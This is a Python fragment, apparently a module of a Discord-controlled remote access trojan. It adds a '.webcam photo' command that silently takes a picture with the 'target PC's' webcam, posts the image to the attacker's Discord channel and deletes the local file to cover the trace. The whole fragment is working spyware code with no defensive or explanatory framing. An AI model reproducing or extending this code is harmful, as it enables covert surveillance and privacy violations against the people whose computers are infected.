from cv2 import VideoCapture, imwrite, CAP_DSHOW
import subprocess
# end of imports

# on message
elif message.content[:7] == '.webcam':
    await message.delete()
    if message.content.strip() == '.webcam':
        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
    else:
        if message.content[8:] == 'photo':
            webcam = VideoCapture(0, CAP_DSHOW)
            result, image = webcam.read()
            imwrite('webcam.png', image)
            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
            subprocess.run('del webcam.png', shell=True)
        else:
            reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
